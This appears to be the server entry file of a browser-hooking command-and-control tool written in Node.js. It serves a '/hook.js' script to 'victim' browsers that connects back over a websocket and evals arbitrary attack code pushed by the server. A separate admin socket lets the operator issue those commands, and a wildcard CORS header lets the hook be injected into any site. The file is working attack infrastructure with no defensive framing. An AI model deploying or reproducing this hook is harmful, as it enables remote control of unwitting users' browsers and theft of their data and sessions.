require('./.env')
const http            = require('http'),
      socketio        = require('socket.io'),
      express         = require('express'),
      victimSession   = require('express-session')({
        secret: process.env.VICTIM_SESSION_SECRET,
        resave: true,
        saveUninitialized: true
      }),
      fs              = require('fs'),
      socketIOClient  = fs.readFileSync('./public/socket-io.js')

/*
  Configure Victim Sockets
*/
const victimApp     = express(),
      victimServer  = http.createServer(victimApp),
      ioVictim      = socketio(victimServer, {
        cookie: false
      })

require('./routes/victim/sockets').configure(ioVictim)

victimApp.use(victimSession)
victimApp.use(function(req, res, next) {
  res.setHeader("Access-Control-Allow-Origin", "*")
  return next()
})
victimApp.use(express.static(__dirname + '/public'))
victimApp.get('/hook.js', function(req, res){
  res.write(socketIOClient)
  res.write(`(function(){const socket = io('ws://${process.env.VICTIM_SOCKET_IP}:${process.env.VICTIM_SOCKET_PORT}');socket.emit('identify','${req.sessionID}');socket.on('execute',function(data){eval(data.func);attack(data.params);});})();`)
  res.end()
})
victimServer.listen(process.env.VICTIM_SOCKET_PORT)
console.log(`Victim socket server listening on :${process.env.VICTIM_SOCKET_PORT}`)



/*
  Configure Admin Sockets
*/
const ioAdmin = socketio(process.env.ADMIN_SOCKET_PORT,{
  cookie: false
})

require('./routes/admin/sockets').configure(ioAdmin)
console.log(`Admin socket server listening on :${process.env.ADMIN_SOCKET_PORT}`)



module.exports.victimServer = victimServer
module.exports.ioVictim     = ioVictim
module.exports.ioAdmin      = ioAdmin